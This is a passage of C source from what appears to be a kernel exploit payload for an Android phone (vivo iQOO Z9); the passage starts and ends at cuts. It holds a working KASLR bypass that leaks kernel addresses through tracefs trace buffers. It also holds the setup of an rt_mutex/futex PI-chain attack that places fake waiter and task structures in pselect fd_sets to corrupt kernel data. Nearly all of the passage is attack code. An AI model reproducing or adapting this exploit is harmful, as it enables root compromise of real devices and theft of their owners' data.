  int saved_errno = errno;
  close(fd);
  unlink(path);
  errno = saved_errno;
  if (!ok) {
    pr_error("slide tracefs trigger write failed errno=%d\n", errno);
    return 0;
  }
  pr_info("slide tracefs trigger bytes=%u\n", 16U * 0x40000U);
  return 1;
}

static int slide_tracefs_leak_kernel_base(void) {
  static const char tracing_on[] =
      SLIDE_TRACEFS_ROOT "/tracing_on";
  static const char trace[] =
      SLIDE_TRACEFS_ROOT "/trace";
  static const char event_enable[] =
      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";

  if (!slide_tracefs_write(tracing_on, "0")) {
    pr_error("slide tracefs setup failed errno=%d\n", errno);
    return 0;
  }

  int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
  if (trace_fd >= 0) {
    close(trace_fd);
  }
  if (!slide_tracefs_write(event_enable, "1") ||
      !slide_tracefs_write(tracing_on, "1")) {
    pr_error("slide tracefs setup failed errno=%d\n", errno);
    return 0;
  }
  if (!slide_tracefs_trigger()) {
    slide_tracefs_write(tracing_on, "0");
    slide_tracefs_write(event_enable, "0");
    return 0;
  }
  sleep(1);

  /* Drain trace_pipe_raw while tracing is still ON. A fresh pipe reader
   * only sees the current page onward, and the final page written before
   * tracing_on=0 can be flooded by unrelated blockers (on MTK, module
   * kthreads emit constantly and push worker events out of the last
   * page). Poll the live stream for up to ~5s instead. */
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  uintptr_t candidate = 0;
  int found = 0;
  enum { SLIDE_TRACEFS_MAX_CPUS = 32 };
  if (cpu_count > SLIDE_TRACEFS_MAX_CPUS) {
    cpu_count = SLIDE_TRACEFS_MAX_CPUS;
  }
  int fds[SLIDE_TRACEFS_MAX_CPUS];
  for (int cpu = 0; cpu < cpu_count; cpu++) {
    char path[128];
    snprintf(path, sizeof(path),
             SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    fds[cpu] = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
  }
  unsigned char page[4096];
  for (int round = 0; round < 500 && !found; round++) {
    for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
      if (fds[cpu] < 0) {
        continue;
      }
      ssize_t got;
      while ((got = read(fds[cpu], page, sizeof(page))) > 0) {
        if (slide_tracefs_parse_page(page, (size_t)got, &candidate)) {
          found = 1;
          break;
        }
      }
    }
    if (!found) {
      usleep(10000);
    }
  }
  for (int cpu = 0; cpu < cpu_count; cpu++) {
    if (fds[cpu] >= 0) {
      close(fds[cpu]);
    }
  }
  slide_tracefs_write(tracing_on, "0");
  slide_tracefs_write(event_enable, "0");
  if (!found) {
    pr_error("slide tracefs worker caller not found\n");
    return 0;
  }

  slide_p0_offset = candidate;
  kaslr_base = KIMAGE_TEXT_BASE + candidate;
  kaslr_slide = candidate;
  kaslr_done = 1;
  /* The recovered virtual base is exact (caller = base + link offset).
   * Use canonical virtual addresses for kernel image data everywhere:
   * the direct-map alias math assumes the phys slide equals the virtual
   * slide, which does not hold on RELR-relocated boots (MTK). */
  data_addr_canonical = 1;
  pr_success("slide-kaslr-ok source=tracefs pid=%d base=%016llx "
             "slide=%016llx p0_offset=%08zx\n",
             getpid(), (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide, slide_p0_offset);
  return 1;
}

int slide_leak_kernel_base(void) {
  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
  if (forced_offset_arg && *forced_offset_arg) {
    char *end = NULL;
    errno = 0;
    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
    if (errno || end == forced_offset_arg || *end ||
        value > SLIDE_TRACEFS_MAX_CANDIDATE || (value & 0xffffULL) != 0) {
      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
      return 0;
    }
    slide_p0_offset = (uintptr_t)value;
    kaslr_base = KIMAGE_TEXT_BASE + slide_p0_offset;
    kaslr_slide = slide_p0_offset;
    kaslr_done = 1;
    data_addr_canonical = 1;
    pr_success("slide-kaslr-ok source=forced pid=%d base=%016llx "
               "slide=%016llx p0_offset=%08zx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide, slide_p0_offset);
    return 1;
  }
  return slide_tracefs_leak_kernel_base();
}

```

---

## slide_app.c

**Path**: `/root/s/references/iQOO-Z9_5G-vivo- research/payload/src/slide_app.c`

```c
#include "common.h"

#include <netinet/in.h>
#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_SIGRETURN) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
#include <asm/sigcontext.h>
#include <ucontext.h>
#endif

#ifndef SLIDE_MAX_ATTEMPTS
#define SLIDE_MAX_ATTEMPTS 20
#endif
#if !defined(SLIDE_STACK_WRITER)
#ifndef SLIDE_PSELECT_WORD_SHIFT
#define SLIDE_PSELECT_WORD_SHIFT 0
#endif
#endif
#ifndef SLIDE_WAIT_NSEC
#define SLIDE_WAIT_NSEC 50000000L
#endif
#ifndef SLIDE_REQUEUE_ARM_USEC
#define SLIDE_REQUEUE_ARM_USEC 0
#endif
#define SLIDE_REQUEUE_MAX_POLLS 1000
#define SLIDE_REQUEUE_POLL_USEC 1000

#if defined(SLIDE_P0_OFFSET_CANDIDATES) && \
    (!defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE)
static const uintptr_t slide_p0_offsets[] = {
  SLIDE_P0_OFFSET_CANDIDATES
};
#endif

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_owner_acquired;
static atomic_int slide_deadlock_seen;
static atomic_int slide_waiter_ok;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;
static atomic_int slide_consumer_ready;
static atomic_int slide_stack_write_window;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
static atomic_uint_fast64_t slide_pselect_started_ns;
static int slide_pselect_production_stack;
#endif
static int slide_route_nfds = PSELECT_ROUTE_NFDS;
static int slide_route_syscall_pad;
static uint64_t slide_route_fine_delay_ticks;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
int slide_p0_session_fresh;
#endif
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
int p0_virtual_base_probe;
#endif

static int slide_commit_stext(uint64_t stext, const char *source);
#ifndef SLIDE_MAX_OFFSET
static const uint64_t slide_max_offset = 0x3f8000ULL;
#else
static const uint64_t slide_max_offset = SLIDE_MAX_OFFSET;
#endif

#if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
static unsigned int slide_tracefs_raw_pages;
static unsigned int slide_tracefs_raw_bytes;
static unsigned int slide_tracefs_raw_events;
static unsigned int slide_tracefs_raw_callers;
static unsigned int slide_tracefs_parse_failures;
static uint64_t slide_tracefs_pending_base;
static unsigned int slide_tracefs_pending_hits;
static uint64_t slide_tracefs_confirmed_base;

static int slide_tracefs_write(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide tracefs open write failed path=%s errno=%d\n", path,
             errno);
    return 0;
  }
  size_t len = strlen(value);
  size_t done = 0;
  while (done < len) {
    ssize_t wrote = write(fd, value + done, len - done);
    if (wrote < 0 && errno == EINTR) {
      continue;
    }
    if (wrote <= 0) {
      pr_warning("slide tracefs write failed path=%s done=%zu len=%zu errno=%d\n",
               path, done, len, errno);
      close(fd);
      return 0;
    }
    done += (size_t)wrote;
  }
  if (close(fd) != 0) {
    pr_warning("slide tracefs close write failed path=%s errno=%d\n", path,
             errno);
    return 0;
  }
  return 1;
}

static int slide_tracefs_read_u32(const char *path, uint32_t *value) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide tracefs open read failed path=%s errno=%d\n", path,
             errno);
    return 0;
  }
  char text[32];
  ssize_t got;
  do {
    got = read(fd, text, sizeof(text) - 1);
  } while (got < 0 && errno == EINTR);
  int read_errno = errno;
  if (close(fd) != 0) {
    pr_warning("slide tracefs close read failed path=%s errno=%d\n", path,
             errno);
    return 0;
  }
  if (got <= 0) {
    pr_warning("slide tracefs read failed path=%s got=%zd errno=%d\n", path,
             got, read_errno);
    return 0;
  }
  text[got] = 0;
  char *end = NULL;
  errno = 0;
  unsigned long parsed = strtoul(text, &end, 10);
  while (end && (*end == ' ' || *end == '\t' || *end == '\r' ||
                 *end == '\n')) {
    end++;
  }
  if (errno || end == text || !end || *end || parsed > UINT32_MAX) {
    pr_warning("slide tracefs bad number path=%s value=%s errno=%d\n", path,
             text, errno);
    return 0;
  }
  *value = (uint32_t)parsed;
  return 1;
}

static int slide_tracefs_clear(const char *path) {
  int fd = open(path, O_WRONLY | O_TRUNC | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide tracefs clear open failed path=%s errno=%d\n", path,
             errno);
    return 0;
  }
  if (close(fd) != 0) {
    pr_warning("slide tracefs clear close failed path=%s errno=%d\n", path,
             errno);
    return 0;
  }
  return 1;
}

static int slide_tracefs_parse_page(const unsigned char *page,
                                    size_t page_len,
                                    uint16_t trace_event_id) {
  if (page_len != PAGE_SIZE) {
    slide_tracefs_parse_failures++;
    return 0;
  }
  uint64_t commit = 0;
  memcpy(&commit, page + 8, sizeof(commit));
  size_t data_len = (size_t)(commit & 0xfffULL);
  size_t end = 16 + data_len;
  if (end > page_len) {
    slide_tracefs_parse_failures++;
    return 0;
  }
  for (size_t pos = 16; pos + 4 <= end;) {
    uint32_t event_header = 0;
    memcpy(&event_header, page + pos, sizeof(event_header));
    uint32_t type_len = event_header & 0x1fU;
    uint32_t time_delta = event_header >> 5;
    if (type_len == 30 || type_len == 31) {
      if (pos + 8 > end) {
        slide_tracefs_parse_failures++;
        return 0;
      }
      pos += 8;
      continue;
    }
    if (type_len == 29) {
      if (!time_delta) {
        break;
      }
      if (pos + 8 > end) {
        slide_tracefs_parse_failures++;
        return 0;
      }
      uint32_t padding_len = 0;
      memcpy(&padding_len, page + pos + 4, sizeof(padding_len));
      size_t total_len = 4 + (size_t)padding_len;
      if (total_len < 8 || pos + total_len > end) {
        slide_tracefs_parse_failures++;
        return 0;
      }
      pos += total_len;
      continue;
    }
    size_t record;
    size_t record_len;
    size_t total_len;
    if (type_len == 0) {
      if (pos + 8 > end) {
        slide_tracefs_parse_failures++;
        return 0;
      }
      uint32_t extended_len = 0;
      memcpy(&extended_len, page + pos + 4, sizeof(extended_len));
      if (extended_len < 4) {
        slide_tracefs_parse_failures++;
        return 0;
      }
      record = pos + 8;
      record_len = (size_t)extended_len - 4;
      total_len = 4 + (size_t)extended_len;
    } else if (type_len <= 28) {
      record = pos + 4;
      record_len = (size_t)type_len * 4;
      total_len = 4 + record_len;
    } else {
      slide_tracefs_parse_failures++;
      return 0;
    }
    if (pos + total_len > end || record + record_len > end) {
      slide_tracefs_parse_failures++;
      return 0;
    }
    uint16_t event_id = 0;
    memcpy(&event_id, page + record, sizeof(event_id));
    slide_tracefs_raw_events++;
    if (event_id == trace_event_id) {
      if (record_len < 24) {
        slide_tracefs_parse_failures++;
        return 0;
      }
      uint64_t caller = 0;
      memcpy(&caller, page + record + 16, sizeof(caller));
#if defined(SLIDE_TRACEFS_STRIP_PAC) && SLIDE_TRACEFS_STRIP_PAC
      caller = (caller & 0x0000ffffffffffffULL) | 0xffff000000000000ULL;
#endif
      if (slide_tracefs_raw_callers < 8) {
        pr_info("slide tracefs raw caller=%016llx event=%u len=%zu\n",
                (unsigned long long)caller, event_id, record_len);
      }
      slide_tracefs_raw_callers++;
      static const uint64_t anchor_offsets[] = {
        SLIDE_TRACEFS_WORKER_CALLER_OFF,
#ifdef SLIDE_TRACEFS_VFORK_CALLER_OFF
        SLIDE_TRACEFS_VFORK_CALLER_OFF,
#endif
#ifdef SLIDE_TRACEFS_SCHED_CALLER_OFF
        SLIDE_TRACEFS_SCHED_CALLER_OFF,
#endif
      };
      for (size_t index = 0;
           index < sizeof(anchor_offsets) / sizeof(anchor_offsets[0]);
           index++) {
        uint64_t base = caller - anchor_offsets[index];
        /* RELR-relocated kernels (MTK) load at an arbitrary 64K-aligned
         * virtual base far above KIMAGE_TEXT_BASE; accept any base inside
         * the kernel VA window and require 3 confirming events. */
        if (base >= KIMAGE_TEXT_BASE && base < 0xfffffffe00000000ULL &&
            (base & 0xffffULL) == 0) {
          uint64_t candidate = base - KIMAGE_TEXT_BASE;
          if (candidate > slide_max_offset) {
            continue;
          }
          if (base != slide_tracefs_pending_base) {
            slide_tracefs_pending_base = base;
            slide_tracefs_pending_hits = 1;
            continue;
          }
          slide_tracefs_pending_hits++;
          if (slide_tracefs_pending_hits < 3) {
            continue;
          }
          pr_success("slide tracefs caller=%016llx anchor=%zu "
                     "base=%016llx candidate=%016llx\n",
                     (unsigned long long)caller, index,
                     (unsigned long long)base,
                     (unsigned long long)candidate);
          slide_tracefs_confirmed_base = base;
          return 2;
        }
      }
    }
    pos += total_len;
  }
  return 1;
}

static int slide_tracefs_trigger_vfork(void) {
#ifdef SLIDE_TRACEFS_VFORK_CALLER_OFF
  for (int index = 0; index < 96; index++) {
    int status = 0;
    pid_t child = vfork();
    if (child < 0) {
      pr_warning("slide tracefs vfork failed errno=%d\n", errno);
      return 0;
    }
    if (child == 0) {
      struct timespec hold = {.tv_sec = 0, .tv_nsec = 1000000L};
      syscall(SYS_nanosleep, &hold, NULL);
      _exit(0);
    }
    if (waitpid(child, &status, 0) != child) {
      pr_warning("slide tracefs waitpid failed errno=%d\n", errno);
      return 0;
    }
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
      pr_warning("slide tracefs vfork child failed status=%d\n", status);
      return 0;
    }
  }
  pr_info("slide tracefs trigger vforks=96 child_sleep_us=1000\n");
  return 1;
#else
  return 0;
#endif
}

static int slide_tracefs_trigger_io(void) {
  char path[96];
  snprintf(path, sizeof(path), "/data/local/tmp/.rmg-trace-io-%d", getpid());
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
  if (fd < 0) {
    pr_warning("slide tracefs trigger open failed errno=%d\n", errno);
    return 0;
  }
  size_t chunk_size = 0x40000;
  unsigned char *chunk = calloc(1, chunk_size);
  if (!chunk) {
    int saved_errno = errno;
    close(fd);
    unlink(path);
    errno = saved_errno;
    pr_warning("slide tracefs trigger alloc failed errno=%d\n", errno);
    return 0;
  }
  int ok = 1;
  for (int round = 0; round < 16 && ok; round++) {
    size_t done = 0;
    while (done < chunk_size) {
      ssize_t wrote = write(fd, chunk + done, chunk_size - done);
      if (wrote < 0 && errno == EINTR) {
        continue;
      }
      if (wrote <= 0) {
        pr_warning("slide tracefs trigger write failed done=%zu size=%zu errno=%d\n",
                 done, chunk_size, errno);
        ok = 0;
        break;
      }
      done += (size_t)wrote;
    }
  }
  free(chunk);
  if (ok && fsync(fd) != 0) {
    pr_warning("slide tracefs trigger fsync failed errno=%d\n", errno);
    ok = 0;
  }
  if (close(fd) != 0) {
    pr_warning("slide tracefs trigger close failed errno=%d\n", errno);
    ok = 0;
  }
  if (unlink(path) != 0) {
    pr_warning("slide tracefs trigger unlink failed path=%s errno=%d\n", path,
             errno);
    ok = 0;
  }
  if (!ok) {
    pr_warning("slide tracefs trigger failed\n");
    return 0;
  }
  pr_info("slide tracefs trigger bytes=%u\n", 16U * 0x40000U);
  return 1;
}

static int slide_tracefs_trigger(void) {
  int vfork_ok = slide_tracefs_trigger_vfork();
  int io_ok = slide_tracefs_trigger_io();
  pr_info("slide tracefs trigger result vfork=%d io=%d\n",
          vfork_ok, io_ok);
  return vfork_ok || io_ok;
}

static int slide_tracefs_leak_kernel_base(void) {
  static const char tracing_on[] =
      SLIDE_TRACEFS_ROOT "/tracing_on";
  static const char trace[] =
      SLIDE_TRACEFS_ROOT "/trace";
  static const char event_enable[] =
      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
  static const char event_id_path[] =
      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/id";
  uint32_t old_tracing = 0;
  uint32_t old_event = 0;
  uint32_t event_id = 0;
  int restore_needed = 0;
  int setup_ok = 0;
  int scan_ok = 1;
  int cpu_files = 0;
  int candidate_count = 0;
  uintptr_t candidate = 0;

  if (!slide_tracefs_read_u32(tracing_on, &old_tracing) ||
      !slide_tracefs_read_u32(event_enable, &old_event) ||
      !slide_tracefs_read_u32(event_id_path, &event_id)) {
    return 0;
  }
  if (old_tracing > 1 || old_event > 1 || event_id > UINT16_MAX ||
      event_id != SLIDE_TRACEFS_EVENT_ID) {
    pr_warning("slide tracefs profile mismatch tracing=%u event=%u id=%u expected=%u\n",
             old_tracing, old_event, event_id, SLIDE_TRACEFS_EVENT_ID);
    return 0;
  }
  restore_needed = 1;
  pr_info("slide tracefs state tracing=%u event=%u id=%u\n",
          old_tracing, old_event, event_id);
  if (!slide_tracefs_write(tracing_on, "0") ||
      !slide_tracefs_write(event_enable, "0") ||
      !slide_tracefs_clear(trace) ||
      !slide_tracefs_write(event_enable, "1") ||
      !slide_tracefs_write(tracing_on, "1")) {
    pr_warning("slide tracefs setup failed\n");
    goto out;
  }
  if (!slide_tracefs_trigger()) {
    goto out;
  }
  if (!slide_tracefs_write(tracing_on, "0") ||
      !slide_tracefs_write(event_enable, "0")) {
    pr_warning("slide tracefs stop failed\n");
    goto out;
  }

  long cpu_count = sysconf(_SC_NPROCESSORS_CONF);
  if (cpu_count <= 0 || cpu_count > 256) {
    pr_warning("slide tracefs bad cpu count=%ld errno=%d\n", cpu_count,
             errno);
    goto out;
  }
  slide_tracefs_raw_pages = 0;
  slide_tracefs_raw_bytes = 0;
  slide_tracefs_raw_events = 0;
  slide_tracefs_raw_callers = 0;
  slide_tracefs_parse_failures = 0;
  slide_tracefs_pending_base = 0;
  slide_tracefs_pending_hits = 0;
  slide_tracefs_confirmed_base = 0;
  for (int cpu = 0; cpu < cpu_count && !slide_tracefs_confirmed_base; cpu++) {
    char path[128];
    snprintf(path, sizeof(path),
             SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0) {
      pr_warning("slide tracefs cpu open failed cpu=%d errno=%d\n", cpu,
               errno);
      scan_ok = 0;
      continue;
    }
    cpu_files++;
    unsigned char page[4096];
    for (;;) {
      ssize_t got = read(fd, page, sizeof(page));
      if (got < 0 && errno == EINTR) {
        continue;
      }
      if (got < 0 && errno == EAGAIN) {
        break;
      }
      if (got < 0) {
        pr_warning("slide tracefs cpu read failed cpu=%d errno=%d\n", cpu,
                 errno);
        scan_ok = 0;
        break;
      }
      if (got == 0) {
        break;
      }
      slide_tracefs_raw_pages++;
      slide_tracefs_raw_bytes += (unsigned int)got;
      int parse_result = slide_tracefs_parse_page(
          page, (size_t)got, (uint16_t)event_id);
      if (!parse_result) {
        scan_ok = 0;
        break;
      }
      if (parse_result == 2) {
        break;
      }
    }
    if (close(fd) != 0) {
      pr_warning("slide tracefs cpu close failed cpu=%d errno=%d\n", cpu,
               errno);
      scan_ok = 0;
    }
  }
  if (slide_tracefs_confirmed_base) {
    candidate = (uintptr_t)(slide_tracefs_confirmed_base - KIMAGE_TEXT_BASE);
    candidate_count = 1;
  }
  pr_info("slide tracefs raw summary pages=%u bytes=%u events=%u callers=%u parse_fail=%u candidates=%d cpu_files=%d\n",
          slide_tracefs_raw_pages, slide_tracefs_raw_bytes,
          slide_tracefs_raw_events, slide_tracefs_raw_callers,
          slide_tracefs_parse_failures, candidate_count, cpu_files);
  if (!scan_ok || slide_tracefs_parse_failures || !cpu_files ||
      candidate_count != 1) {
    pr_warning("slide tracefs candidate gate failed\n");
    goto out;
  }
  setup_ok = 1;

out:
  if (restore_needed) {
    int restore_ok = 1;
    restore_ok &= slide_tracefs_write(tracing_on, "0");
    restore_ok &= slide_tracefs_write(event_enable,
                                      old_event ? "1" : "0");
    restore_ok &= slide_tracefs_write(tracing_on,
                                      old_tracing ? "1" : "0");
    pr_info("slide tracefs restore tracing=%u event=%u ok=%d\n",
            old_tracing, old_event, restore_ok);
    if (!restore_ok) {
      return 0;
    }
  }
  if (!setup_ok) {
    return 0;
  }
  pr_success("slide tracefs caller gate candidate=%08zx\n", candidate);
  return slide_commit_stext(KIMAGE_TEXT_BASE + candidate, "tracefs");
}
#endif

#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
static int slide_commit_virtual_base(uint64_t base, const char *source) {
  if ((base >> 48) != 0xffff || (base & 0x1fffffULL) != 0 ||
      base < KIMAGE_VIRTUAL_BASE_MIN || base > KIMAGE_VIRTUAL_BASE_MAX ||
      base > UINT64_MAX - ASHMEM_FOPS_OFF) {
    pr_warning("virtual base rejected source=%s base=%016llx\n",
               source, (unsigned long long)base);
    return 0;
  }
  kaslr_base = base;
  kaslr_slide = base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  data_addr_canonical = 1;
  app_publish_p0_offset(slide_p0_offset);
  pr_success("slide-kaslr-ok source=%s pid=%d base=%016llx "
             "virtual_slide=%016llx p0_offset=%08zx\n",
             source, getpid(), (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide, slide_p0_offset);
  return 1;
}
#endif

static useconds_t slide_enter_delay_usec(void) {
#if defined(SLIDE_STACK_WRITER)
  return 0;
#else
  const char *forced = getenv("SLIDE_ENTER_DELAY_USEC");
  if (!forced || !*forced) {
    forced = getenv("PSELECT_DELAY_USEC");
  }
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 && value <= 1000000) {
      return (useconds_t)value;
    }
  }
  return PSELECT_ENTER_DELAY_USEC;
#endif
}

static void slide_wait_before_consume(int sequence) {
  if (sequence == 1) {
    useconds_t delay = slide_enter_delay_usec();
    if (delay) {
      usleep(delay);
    }
  }
}

static uint64_t slide_select_route_fine_delay_ticks(void) {
#if defined(APP_FOPS_ROUTE_FINE_DELAY_TICKS)
  static const uint64_t delays[] = {
    APP_FOPS_ROUTE_FINE_DELAY_TICKS
  };
  size_t attempt = 1;
  const char *text = getenv("S23_SUPERVISOR_ATTEMPT");
  if (text && *text) {
    char *end = NULL;
    errno = 0;
    unsigned long value = strtoul(text, &end, 0);
    if (errno || end == text || *end || value == 0) {
      pr_error("bad S23_SUPERVISOR_ATTEMPT value=%s\n", text);
      return UINT64_MAX;
    }
    attempt = value;
  }
  return delays[(attempt - 1) % (sizeof(delays) / sizeof(delays[0]))];
#else
  return 0;
#endif
}

static int slide_override_route_coarse_delay(int *delay) {
  const char *text = getenv("STACK_WRITER_DELAY_USEC");
  if (!text || !*text) {
    return 1;
  }
  char *end = NULL;
  errno = 0;
  long value = strtol(text, &end, 0);
  if (errno || end == text || *end || value < 0 || value > 1000000) {
    pr_error("bad STACK_WRITER_DELAY_USEC value=%s\n", text);
    return 0;
  }
  *delay = (int)value;
  return 1;
}

static inline uint64_t slide_read_cntvct(void) {
  uint64_t value;
  __asm__ volatile("isb\n\tmrs %0, cntvct_el0\n\tisb"
                   : "=r"(value) :: "memory");
  return value;
}

static void slide_apply_route_fine_delay(void) {
  uint64_t ticks = slide_route_fine_delay_ticks;
  if (!ticks || ticks == UINT64_MAX) {
    return;
  }
  uint64_t start = slide_read_cntvct();
  while (slide_read_cntvct() - start < ticks) {
    __asm__ volatile("yield" ::: "memory");
  }
}

#if !defined(SLIDE_STACK_WRITER)
static uint64_t slide_fdset_get_word(const fd_set *set, int word) {
  uint64_t value = 0;
  memcpy(&value, (const unsigned char *)set + word * sizeof(value),
         sizeof(value));
  return value;
}
#endif

static void slide_log_child_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  const char *stack_writer = "pselect";
#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_MCAST) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_MCAST
  stack_writer = "mcast";
#elif defined(SLIDE_STACK_WRITER) && \
      defined(SLIDE_STACK_WRITER_SIGRETURN) && \
      SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
  stack_writer = "sigreturn";
#endif
  pr_success("slide child context stack_writer=%s pid=%d uid=%u euid=%u "
             "gid=%u egid=%u attr=%s enforce=%s\n",
             stack_writer, getpid(), getuid(), geteuid(), getgid(), getegid(),
             attr, enforce);
}

#if !defined(SLIDE_STACK_WRITER)
int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (slide_route_nfds + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
  return SLIDE_PSELECT_WORD_SHIFT + waiter_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

uint64_t slide_pselect_get_global_word(
    const fd_set *in, const fd_set *out, const fd_set *ex,
    int words_per_set, int global_word) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      return slide_fdset_get_word(in, word_idx);
    case 1:
      return slide_fdset_get_word(out, word_idx);
    case 2:
      return slide_fdset_get_word(ex, word_idx);
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = slide_pselect_global_word(waiter_word);
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               slide_route_nfds);
  }
}

void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = slide_pselect_words_per_set();
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  uintptr_t stack_tree_parent = slide_oracle_parent;
  uintptr_t stack_tree_right = 0;
  uintptr_t stack_tree_left = slide_oracle_target;
  uintptr_t stack_pi_parent = slide_oracle_parent;
  uintptr_t stack_pi_right = 0;
  uintptr_t stack_pi_left = slide_oracle_target;
  uintptr_t stack_task = fake_task;
  slide_pselect_production_stack = 0;
#if defined(APP_PRODUCTION_STACK_PI_RIGHT_ONLY) && \
    APP_PRODUCTION_STACK_PI_RIGHT_ONLY
  if (slide_oracle_parent == fake_fops &&
      slide_oracle_target == data_addr(ASHMEM_MISC_FOPS)) {
    /*
     * The stale pselect waiter is dequeued from the lock waiter tree before
     * the PI-tree requeue.  Keep its proven oracle tree and fake-task fields;
     * build 58 cleared the tree child and consequently produced no write.
     * Isolate only the established FOPS PI-child direction here.
     */
    stack_pi_right = data_addr(ASHMEM_MISC_FOPS);
    stack_pi_left = 0;
    slide_pselect_production_stack = 1;
  }
#endif
#else
  slide_pselect_production_stack = 0;
#endif
#endif
  struct slide_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    {0, stack_tree_parent, "tree_pc"},
    {1, stack_tree_right, "tree_right"},
    {2, stack_tree_left, "tree_left"},
    {3, stack_pi_parent, "pi_pc"},
    {4, stack_pi_right, "pi_right"},
    {5, stack_pi_left, "pi_left"},
#else
    {0, slide_oracle_parent, "tree_pc"},
    {1, 0, "tree_right"},
    {2, slide_oracle_target, "tree_left"},
    {3, slide_oracle_parent, "pi_pc"},
    {4, 0, "pi_right"},
    {5, slide_oracle_target, "pi_left"},
#endif
#else
    {0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
    {1, 0, "tree_right"},
    {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
    {3, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi_pc"},
    {4, 0, "pi_right"},
    {5, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi_left"},
#endif
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION && \
